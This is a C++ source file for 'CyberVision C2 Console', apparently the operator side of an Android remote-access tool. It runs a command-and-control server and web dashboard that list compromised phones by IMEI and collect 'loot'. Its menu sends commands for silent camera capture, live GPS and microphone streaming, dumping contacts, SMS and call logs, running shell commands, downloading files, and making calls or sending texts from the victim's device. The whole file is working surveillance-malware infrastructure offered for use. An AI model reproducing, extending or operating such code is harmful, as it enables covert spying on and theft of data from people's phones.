/**
 * CyberVision C2 Console v3.1 (C++)
 * ──────────────────────────────────
 * - Standalone TCP server (no Java dependency to stay alive)
 * - Java engine spawned for protocol handling (optional, graceful fallback)
 * - cpp-inquirer for interactive select menus
 * - Persistent CLI loop (never exits after a command)
 * - Built-in HTTP Web Dashboard
 * 
 * Build: g++ -std=c++17 -pthread -O2 -I../include -o cybervision main.cpp
 */

#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <vector>
#include <map>
#include <sstream>
#include <fstream>
#include <cstdio>
#include <cstring>
#include <csignal>
#include <atomic>
#include <chrono>
#include <algorithm>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/wait.h>

// cpp-inquirer
#include "inquirer.h"

// ─── ANSI Colors ─────────────────────────────────────────────────────────────
#define RST    "\033[0m"
#define BOLD   "\033[1m"
#define DIM    "\033[2m"
#define BLUE   "\033[38;5;75m"
#define GREEN  "\033[38;5;78m"
#define YELLOW "\033[38;5;220m"
#define RED    "\033[38;5;203m"
#define CYAN   "\033[38;5;87m"
#define GRAY   "\033[38;5;245m"

// ─── Globals ─────────────────────────────────────────────────────────────────
static std::atomic<bool> g_running{true};
static int g_c2_port  = 9999;
static int g_web_port = 8080;

static FILE* g_java_in  = nullptr;  // Write to Java stdin
static FILE* g_java_out = nullptr;  // Read from Java stdout
static pid_t g_java_pid = -1;
static bool  g_java_alive = false;

struct ClientInfo {
    std::string imei;
    std::string model;
    std::string ip;
};
static std::vector<ClientInfo> g_clients;
static std::mutex g_clients_mtx;
static std::mutex g_output_mtx;

// ─── Utility ─────────────────────────────────────────────────────────────────
static std::string timestamp() {
    auto now = std::chrono::system_clock::now();
    auto t   = std::chrono::system_clock::to_time_t(now);
    char buf[32];
    strftime(buf, sizeof(buf), "%H:%M:%S", localtime(&t));
    return std::string(buf);
}

static std::string jsonGet(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    auto pos = json.find(search);
    if (pos == std::string::npos) return "";
    auto start = pos + search.length();
    auto end = json.find("\"", start);
    if (end == std::string::npos) return "";
    return json.substr(start, end - start);
}

// ─── Send command to Java engine ─────────────────────────────────────────────
static void sendToJava(const std::string& cmd, const std::string& imei = "", const std::string& args = "") {
    if (!g_java_in || !g_java_alive) return;
    std::string json = "{\"cmd\":\"" + cmd + "\",\"imei\":\"" + imei + "\",\"args\":\"" + args + "\"}\n";
    fputs(json.c_str(), g_java_in);
    fflush(g_java_in);
}

// ─── Print helpers ───────────────────────────────────────────────────────────
static void printLine(const std::string& color, const std::string& prefix, const std::string& msg) {
    std::lock_guard<std::mutex> lock(g_output_mtx);
    std::cout << color << "  " << prefix << " " << RST << msg << std::endl;
}

// ─── Java stdout reader thread ───────────────────────────────────────────────
static void javaReaderThread() {
    char buf[4096];
    while (g_running && g_java_out) {
        if (fgets(buf, sizeof(buf), g_java_out)) {
            std::string line(buf);
            while (!line.empty() && (line.back() == '\n' || line.back() == '\r'))
                line.pop_back();
            
            std::string type = jsonGet(line, "type");
            std::string data = jsonGet(line, "data");
            
            if (type == "CLIENT_CONNECTED") {
                auto p1 = data.find("|");
                auto p2 = data.find("|", p1+1);
                std::string imei  = data.substr(0, p1);
                std::string model = (p1 != std::string::npos) ? data.substr(p1+1, p2-p1-1) : "?";
                std::string ip    = (p2 != std::string::npos) ? data.substr(p2+1) : "?";
                {
                    std::lock_guard<std::mutex> lock(g_clients_mtx);
                    g_clients.push_back({imei, model, ip});
                }
                printLine(GREEN, "[+]", "Client: " + imei + " (" + model + " @ " + ip + ")");
            } else if (type == "CLIENT_DISCONNECTED") {
                std::lock_guard<std::mutex> lock(g_clients_mtx);
                g_clients.erase(std::remove_if(g_clients.begin(), g_clients.end(),
                    [&](const ClientInfo& c) { return c.imei == data; }), g_clients.end());
                printLine(RED, "[-]", "Disconnected: " + data);
            } else if (type == "LOOT") {
                printLine(YELLOW, "[LOOT]", data);
            } else if (type == "CMD_SENT") {
                printLine(CYAN, "[→]", data);
            } else if (type == "ERROR") {
                printLine(RED, "[!]", data);
            } else if (type == "SERVER_STARTED") {
                printLine(GREEN, "[*]", "Java Engine: " + data);
            }
        } else {
            break;
        }
    }
    g_java_alive = false;
}

// ─── Web Dashboard HTTP Server ───────────────────────────────────────────────
static void webServerThread() {
    int srv_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (srv_fd < 0) return;
    
    int opt = 1;
    setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(g_web_port);
    
    if (bind(srv_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        // Try next port
        g_web_port++;
        addr.sin_port = htons(g_web_port);
        if (bind(srv_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(srv_fd);
            return;
        }
    }
    listen(srv_fd, 10);
    
    while (g_running) {
        struct sockaddr_in client_addr{};
        socklen_t client_len = sizeof(client_addr);
        int cfd = accept(srv_fd, (struct sockaddr*)&client_addr, &client_len);
        if (cfd < 0) continue;
        
        char req_buf[2048] = {};
        ssize_t n = read(cfd, req_buf, sizeof(req_buf) - 1);
        if (n <= 0) { close(cfd); continue; }
        std::string request(req_buf);
        
        std::string response;
        
        if (request.find("GET /api/clients") != std::string::npos) {
            std::lock_guard<std::mutex> lock(g_clients_mtx);
            std::string json = "{\"clients\":[";
            for (size_t i = 0; i < g_clients.size(); i++) {
                if (i > 0) json += ",";
                json += "{\"imei\":\"" + g_clients[i].imei + "\",\"model\":\"" + g_clients[i].model +
                        "\",\"ip\":\"" + g_clients[i].ip + "\"}";
            }
            json += "],\"c2_port\":" + std::to_string(g_c2_port) + 
                    ",\"web_port\":" + std::to_string(g_web_port) + 
                    ",\"host\":\"localhost\",\"loot_count\":0}";
            response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\n"
                       "Content-Length: " + std::to_string(json.size()) + "\r\n\r\n" + json;
        } else if (request.find("GET /") != std::string::npos) {
            std::ifstream f("web/dashboard.html");
            std::string html;
            if (f.is_open()) {
                html.assign((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            } else {
                html = "<html><body style='background:#0d1117;color:#c9d1d9;font-family:monospace;padding:40px'>"
                       "<h1 style='color:#58a6ff'>CyberVision C2</h1>"
                       "<p>Place <code>web/dashboard.html</code> in the working directory.</p></body></html>";
            }
            response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + 
                       std::to_string(html.size()) + "\r\n\r\n" + html;
        } else {
            response = "HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nNot Found";
        }
        
        write(cfd, response.c_str(), response.size());
        close(cfd);
    }
    close(srv_fd);
}

// ─── Spawn Java C2 Engine ────────────────────────────────────────────────────
static bool spawnJavaEngine() {
    int pipe_in[2], pipe_out[2];
    if (pipe(pipe_in) < 0 || pipe(pipe_out) < 0) return false;
    
    g_java_pid = fork();
    if (g_java_pid < 0) return false;
    
    if (g_java_pid == 0) {
        close(pipe_in[1]);
        close(pipe_out[0]);
        dup2(pipe_in[0], STDIN_FILENO);
        dup2(pipe_out[1], STDOUT_FILENO);
        close(pipe_in[0]);
        close(pipe_out[1]);
        execlp("java", "java", "-cp", "tools/classes", 
               "cybervision.server.C2Server", 
               "-p", std::to_string(g_c2_port).c_str(),
               "--log-dir", "logs", "--loot-dir", "loot", nullptr);
        _exit(1);
    }
    
    close(pipe_in[0]);
    close(pipe_out[1]);
    g_java_in  = fdopen(pipe_in[1], "w");
    g_java_out = fdopen(pipe_out[0], "r");
    g_java_alive = (g_java_in && g_java_out);
    return g_java_alive;
}

// ─── Print banner ────────────────────────────────────────────────────────────
static void printBanner() {
    std::cout << "\n";
    std::cout << BLUE << "  ╔══════════════════════════════════════════════════════════╗\n";
    std::cout << "  ║" << RST << BOLD << "       ⚡ CyberVision C2 Console v3.1                   " << RST << BLUE << "║\n";
    std::cout << "  ║" << RST << "  C2 Port  : " << GREEN << g_c2_port << RST << "                                        " << BLUE << "║\n";
    std::cout << "  ║" << RST << "  Web      : " << GREEN << "http://localhost:" << g_web_port << "/" << RST << "                    " << BLUE << "║\n";
    std::cout << "  ║" << RST << "  Engine   : Java (protocol + handlers)                 " << BLUE << "║\n";
    std::cout << "  ║" << RST << "  Console  : C++ (CLI + Web Dashboard)                  " << BLUE << "║\n";
    std::cout << "  ║" << RST << "  Type " << BOLD << "'help'" << RST << " for commands                            " << BLUE << "║\n";
    std::cout << "  ╚══════════════════════════════════════════════════════════╝" << RST << "\n\n";
}

// ─── Help ────────────────────────────────────────────────────────────────────
static void printHelp() {
    std::cout << "\n";
    std::cout << BLUE << "  ╭──────────────────────── COMMANDS ────────────────────────╮\n";
    std::cout << "  │" << RST << " " << BOLD << "GENERAL" << RST << "                                                  " << BLUE << "│\n";
    std::cout << "  │" << RST << "   list                 Show connected devices           " << BLUE << "│\n";
    std::cout << "  │" << RST << "   use <id> [action]    Interact with device             " << BLUE << "│\n";
    std::cout << "  │" << RST << "   exit                 Shutdown & save logs             " << BLUE << "│\n";
    std::cout << "  │" << RST << "                                                        " << BLUE << "│\n";
    std::cout << "  │" << RST << " " << BOLD << "DEVICE ACTIONS" << RST << "                                             " << BLUE << "│\n";
    std::cout << "  │" << RST << "   info / advinfo       Device information              " << BLUE << "│\n";
    std::cout << "  │" << RST << "   photo                Silent camera capture            " << BLUE << "│\n";
    std::cout << "  │" << RST << "   gps / gps_stop       GPS stream                      " << BLUE << "│\n";
    std::cout << "  │" << RST << "   mic / mic_stop       Microphone stream               " << BLUE << "│\n";
    std::cout << "  │" << RST << "   contacts / sms       Dump contacts / SMS             " << BLUE << "│\n";
    std::cout << "  │" << RST << "   call_log             Call history                    " << BLUE << "│\n";
    std::cout << "  │" << RST << "   clipboard            Clipboard content               " << BLUE << "│\n";
    std::cout << "  │" << RST << "   shell <cmd>          Execute shell command           " << BLUE << "│\n";
    std::cout << "  │" << RST << "   dir <path>           List directory                  " << BLUE << "│\n";
    std::cout << "  │" << RST << "   download <path>      Download file                   " << BLUE << "│\n";
    std::cout << "  │" << RST << "   toast <msg>          Show message on screen          " << BLUE << "│\n";
    std::cout << "  │" << RST << "   vibrate <ms>         Vibrate device                  " << BLUE << "│\n";
    std::cout << "  │" << RST << "   call <number>        Make phone call                 " << BLUE << "│\n";
    std::cout << "  │" << RST << "   send_sms <num> <msg> Send SMS                        " << BLUE << "│\n";
    std::cout << "  │" << RST << "   url <link>           Open URL in browser             " << BLUE << "│\n";
    std::cout << "  ╰────────────────────────────────────────────────────────╯" << RST << "\n\n";
}

// ─── List clients ────────────────────────────────────────────────────────────
static void listClients() {
    std::lock_guard<std::mutex> lock(g_clients_mtx);
    if (g_clients.empty()) {
        std::cout << GRAY << "  No active sessions." << RST << std::endl;
        return;
    }
    std::cout << "\n";
    std::cout << "  " << BOLD << "#   IMEI                   IP                    Device" << RST << "\n";
    std::cout << "  " << GRAY << "──  ─────────────────────  ────────────────────  ──────────────────" << RST << "\n";
    for (size_t i = 0; i < g_clients.size(); i++) {
        printf("  %-3zu %-22s %-22s %s\n", i, 
               g_clients[i].imei.c_str(), g_clients[i].ip.c_str(), g_clients[i].model.c_str());
    }
    std::cout << "\n";
}

// ─── Interactive device menu (cpp-inquirer) ──────────────────────────────────
static void interactWithDevice(const std::string& deviceId) {
    std::vector<std::string> actions = {
        "info", "advinfo", "photo", "gps", "gps_stop",
        "mic", "mic_stop", "contacts", "sms", "sms_monitor",
        "call_log", "clipboard", "shell", "dir", "download",
        "toast", "vibrate", "call", "send_sms", "url", "← back"
    };

    while (g_running) {
        std::cout << "\n";
        alx::Question actionQ("action", "Action for device [" + deviceId + "]", actions);
        std::string action = actionQ.ask(true);

        if (action == "\u2190 back" || action == "← back" || action.empty()) break;

        // Prompt for args if needed
        std::string args;
        if (action == "toast" || action == "shell" || action == "dir" || 
            action == "download" || action == "url" || action == "call") {
            alx::Question argQ("arg", "Argument", alx::Type::text);
            args = argQ.ask();
        } else if (action == "send_sms") {
            alx::Question numQ("num", "Phone number", alx::Type::text);
            std::string num = numQ.ask();
            alx::Question msgQ("msg", "Message", alx::Type::text);
            std::string msg = msgQ.ask();
            args = num + ";" + msg;
        } else if (action == "vibrate") {
            alx::Question durQ("dur", "Duration (ms)", alx::Type::integer);
            args = durQ.ask();
            if (args.empty()) args = "2000";
        }

        sendToJava(action, deviceId, args);
        
        // Wait a moment for response
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

// ─── Main CLI loop ───────────────────────────────────────────────────────────
static void cliLoop() {
    std::string line;
    while (g_running) {
        std::cout << BLUE << "cybervision" << RST << "> " << std::flush;
        if (!std::getline(std::cin, line)) break;
        
        // Trim
        line.erase(0, line.find_first_not_of(" \t"));
        if (!line.empty()) line.erase(line.find_last_not_of(" \t") + 1);
        if (line.empty()) continue;

        // Parse
        std::istringstream iss(line);
        std::string cmd, arg1, rest;
        iss >> cmd;
        iss >> arg1;
        std::getline(iss, rest);
        if (!rest.empty() && rest[0] == ' ') rest = rest.substr(1);

        std::transform(cmd.begin(), cmd.end(), cmd.begin(), ::tolower);

        if (cmd == "help" || cmd == "?") {
            printHelp();
        } else if (cmd == "exit" || cmd == "quit") {
            g_running = false;
            sendToJava("shutdown");
            std::cout << GREEN << "  [*] " << RST << "Shutting down..." << std::endl;
            break;
        } else if (cmd == "list" || cmd == "ls" || cmd == "sessions") {
            if (g_java_alive) sendToJava("list");
            listClients();
        } else if (cmd == "use" || cmd == "interact") {
            if (arg1.empty()) {
                std::cout << RED << "  [!] Usage: use <device_id> [action] [args]" << RST << std::endl;
                continue;
            }
            if (rest.empty()) {
                // Interactive menu mode
                interactWithDevice(arg1);
            } else {
                // Direct mode: use <id> <action> [args]
                std::istringstream rest_iss(rest);
                std::string action, action_args;
                rest_iss >> action;
                std::getline(rest_iss, action_args);
                if (!action_args.empty() && action_args[0] == ' ') action_args = action_args.substr(1);
                sendToJava(action, arg1, action_args);
            }
        } else if (cmd == "clear") {
            std::cout << "\033[2J\033[H" << std::flush;
        } else {
            std::cout << RED << "  [!] Unknown: '" << cmd << "'. Type 'help'." << RST << std::endl;
        }
    }
}

// ─── Signal handler ──────────────────────────────────────────────────────────
static void signalHandler(int) {
    g_running = false;
    sendToJava("shutdown");
    if (g_java_pid > 0) kill(g_java_pid, SIGTERM);
    std::cout << "\n" << GREEN << "  [*] " << RST << "Terminated." << std::endl;
    _exit(0);
}

// ─── Main ────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    for (int i = 1; i < argc; i++) {
        if (std::string(argv[i]) == "-p" && i + 1 < argc) g_c2_port = std::atoi(argv[++i]);
        if (std::string(argv[i]) == "-w" && i + 1 < argc) g_web_port = std::atoi(argv[++i]);
        if (std::string(argv[i]) == "--help") {
            std::cout << "Usage: cybervision [-p c2_port] [-w web_port]\n";
            return 0;
        }
    }
    
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    printBanner();
    
    // Start web dashboard
    std::thread webThread(webServerThread);
    webThread.detach();
    printLine(GREEN, "[*]", "Web Dashboard → http://localhost:" + std::to_string(g_web_port) + "/");
    
    // Try to spawn Java engine (graceful if it fails)
    printLine(GREEN, "[*]", "Starting Java C2 Engine on port " + std::to_string(g_c2_port) + "...");
    if (spawnJavaEngine()) {
        std::thread readerThread(javaReaderThread);
        readerThread.detach();
        printLine(GREEN, "[✓]", "Java engine running.");
    } else {
        printLine(YELLOW, "[!]", "Java engine not available. Run './build.sh' first.");
        printLine(YELLOW, "[!]", "Console will work in offline mode (no device connections).");
    }
    
    std::cout << "\n";
    
    // CLI loop (never exits until user types 'exit')
    cliLoop();
    
    // Cleanup
    if (g_java_pid > 0) {
        kill(g_java_pid, SIGTERM);
        waitpid(g_java_pid, nullptr, WNOHANG);
    }
    return 0;
}
